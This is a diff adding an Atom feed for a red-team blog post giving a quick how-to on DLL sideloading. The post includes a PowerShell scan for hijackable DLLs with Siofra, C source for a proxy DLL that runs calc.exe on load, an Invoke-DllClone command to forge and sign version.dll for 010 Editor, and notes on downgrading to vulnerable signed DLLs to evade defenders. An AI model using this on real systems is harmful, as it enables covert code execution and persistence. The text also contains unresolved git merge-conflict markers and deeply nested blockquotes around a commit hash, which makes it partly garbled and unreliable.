@@ -1,0 +1,144 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>gbaru's blog - Red</title><link href="https://blog.riskreduction.net/" rel="alternate"></link><link href="https://blog.riskreduction.net/feeds/red.atom.xml" rel="self"></link><id>https://blog.riskreduction.net/</id><updated>2023-06-09T22:00:00+02:00</updated><entry><title>DLL-Sideloading Attack: A Fast How-To</title><link href="https://blog.riskreduction.net/dll-sideloading-attack-a-fast-how-to.html" rel="alternate"></link><published>2023-06-09T22:00:00+02:00</published><updated>2023-06-09T22:00:00+02:00</updated><author><name>gbaru</name></author><id>tag:blog.riskreduction.net,2023-06-09:/dll-sideloading-attack-a-fast-how-to.html</id><summary type="html">&lt;h2&gt;What is DLL-Sideloading&lt;/h2&gt;
+&lt;p&gt;In this guide, we will provide a quick overview of a DLL-sideloading attack and demonstrate how it can be executed.
+Dynamic link libraries (DLLs) are loaded by the operating system (OS) when an application starts. There are two main methods of loading DLLs, and we focus on …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is DLL-Sideloading&lt;/h2&gt;
+&lt;p&gt;In this guide, we will provide a quick overview of a DLL-sideloading attack and demonstrate how it can be executed.
+Dynamic link libraries (DLLs) are loaded by the operating system (OS) when an application starts. There are two main methods of loading DLLs, and we focus on those that are specified only by name and not by an absolute path.&lt;/p&gt;
+&lt;p&gt;DLLs without a specified path are searched by the OS. The OS has a defined search order, which can vary depending on certain settings such as Safe-DLL. To determine the specific search order for your system, you can conduct a search or refer to relevant documentation.&lt;/p&gt;
+&lt;h2&gt;The Attack&lt;/h2&gt;
+&lt;p&gt;If we can successfully place our own loaded DLL in a directory that is part of the search order and is positioned earlier than the original file, our DLL will be loaded along with the program. It is crucial to note that we must have write access to the directory in order to accomplish this.&lt;/p&gt;
+&lt;h2&gt;Tools&lt;/h2&gt;
+&lt;h3&gt;siofra&lt;/h3&gt;
+&lt;p&gt;There is a tool that is able to search for these kinds of vulnerabilities I like:
+It is &lt;a href="https://github.com/Cybereason/siofra"&gt;siofra&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Consider the following powershell script from &lt;a href="https://twitter.com/ShitSecure/status/1566126264469098497/photo/1"&gt;here&lt;/a&gt;. For 32-bit exchange the Siofra.exe&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Get-ChildItem&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\Program Files\&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Filter&lt;/span&gt; &lt;span class="p"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;-Recurse&lt;/span&gt; &lt;span class="o"&gt;-File&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;ForEach&lt;/span&gt;&lt;span class="n"&gt;-Object&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;hijacktest&lt;/span&gt;
+    &lt;span class="nv"&gt;$binarytoCheck&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;C:\Program Files\&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;
+    &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Tools&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;siofra&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Siofra64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-mode&lt;/span&gt; &lt;span class="n"&gt;file-scan&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-enum-dependency&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-dll-hijack&lt;/span&gt; &lt;span class="o"&gt;-f&lt;/span&gt; &lt;span class="nv"&gt;$binarytoCheck&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;hijacktest&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;toCheck&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+Generally the output can be considered in two parts, the binary analysis shows which dlls might be attackable with an exlamation mark:
+=======
+Generally the output can be considered in two parts, the binary analysis shows which DLLs might be attackable with an exlamation mark:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt="picture 1" src="../images/49369742dbe0ea41b57696a371613a5574117beee51a7cf96318b04763785fb5.png"&gt;  &lt;/p&gt;
+&lt;p&gt;In the next section it will analyse the probable attackable libraries and gives an exploitabilty suggestion:
+&lt;img alt="picture 2" src="../images/38019f07c834ac302e5f4c84eba042d7d9a2836f8f507832967946b3a8177bda.png"&gt;  &lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+Here you can see, which dll's one would have to place and where.
+=======
+Here you can see, which DLL's one would have to place and where.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc
+A nice next step would be to get which of the vulnerable marked locations are writeable to us.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;Koppeling&lt;/h3&gt;
+&lt;p&gt;When placing a DLL with our attack code, we quickly realize the need to provide all the functions that the main binary wants to import from the library. This challenge is addressed by using &lt;a href="https://github.com/monoxgas/Koppeling"&gt;koppeling&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;Koppeling is a tool that allows us to provide the original desired DLL and our attacker code separately. It facilitates the merging of these components, ensuring that all the required functions are available for the application.&lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+I use &lt;a href="https://github.com/jfmaes/Invoke-DLLClone"&gt;Invoke-DLLClone&lt;/a&gt;, which uses Koppeling inside, since I had problems with the original code. Then we just need some dll code like this:
+=======
+I use &lt;a href="https://github.com/jfmaes/Invoke-DLLClone"&gt;Invoke-DLLClone&lt;/a&gt;, which uses Koppeling inside, since I had problems with the original code. Then we just need some DLL code like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;quot;pch.h&amp;quot;&lt;/span&gt;
+
+&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;WINAPI&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fireLazor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpParameter&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;WinExec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;calc.exe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;BOOL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;APIENTRY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DllMain&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HMODULE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hModule&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ul_reason_for_call&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpReserved&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;switch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ul_reason_for_call&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_PROCESS_ATTACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fireLazor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;CloseHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_THREAD_ATTACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_THREAD_DETACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;DLL_PROCESS_DETACH&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Example&lt;/h3&gt;
+&lt;p&gt;I will attack 010 editor. As we saw before, its version.dll is vulnerable.&lt;/p&gt;
+&lt;p&gt;Compile the source code from above with Visual Studio as a DLL library and run&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;Invoke-DllClone&lt;/span&gt; &lt;span class="n"&gt;-Source&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;System32&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-target&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Dll1&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Release&lt;/span&gt;&lt;span class="p"&gt;\&lt;/span&gt;&lt;span class="n"&gt;urname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-output&lt;/span&gt; &lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dll&lt;/span&gt; &lt;span class="n"&gt;-sign&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Placing it in the same directory as 010 editor and running it will cause this:&lt;/p&gt;
+&lt;p&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
+&lt;img alt="picture 3" src="../images/aed4d3a15b0f37c3c97b5f5b5ba5a23b950a4742a951ec51dae51ae7a9594800.png"&gt;&lt;br&gt;
+=======&lt;/p&gt;
+&lt;p&gt;&lt;img alt="picture 4" src="../images/751f81fedc6f887b1a11848c7b64673a878e2f0dcefdbbe7c000a117b6e71a12.png"&gt;  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ffb806d5d60bcee6825dda9c7472b68de6a260cc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Downgrading&lt;/h2&gt;
+&lt;p&gt;Most of the time, I consider myself to be in a lower privileged position and contemplate injecting my code somewhere. However, there is another attack against DLL sideloading known as downgrading. This attack may be challenging or ineffective in low-privilege situations, but it becomes particularly interesting in higher privilege scenarios.&lt;/p&gt;
+&lt;p&gt;With downgrading, we can replace a DLL with a known vulnerable version. If the other imported functions remain intact, the loading process will succeed (although there may be cases where the output of the functions has changed, resulting in runtime issues, but this is not very common).&lt;/p&gt;
+&lt;p&gt;A downgraded attack-code-free DLL is extremely difficult for the blue team to track. In fact, it can even be an officially signed DLL. Of course, it's essential to have an appropriate exploit to make use of this technique, so keep that in mind.&lt;/p&gt;</content><category term="Red"></category><category term="Koppeling"></category><category term="DLL"></category><category term="Sideload"></category><category term="Sideloading"></category><category term="Red-Team"></category><category term="Windows"></category></entry></feed>
